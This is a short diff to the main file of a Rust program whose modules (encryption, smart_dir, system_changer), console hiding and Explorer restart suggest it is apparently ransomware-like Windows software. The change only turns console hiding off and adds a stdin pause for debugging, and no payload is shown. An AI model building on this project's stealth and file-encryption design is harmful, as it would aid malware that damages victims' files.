@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"] // hides execution console
+//#![windows_subsystem = "windows"] // hides execution console
 mod encryption;
 mod smart_dir;
 mod system_changer;
@@ -116,8 +116,8 @@ fn main() {
     restart_explorer();
 
     // HACK keeping window opened for debugging purposes.
-    //let mut buf = String::new();
-    //let std::io::stdin().read_line(&mut buf);
+    let mut buf = String::new();
+    std::io::stdin().read_line(&mut buf);
     /*
     for path in common_folder_paths {
         println!("{}", path);
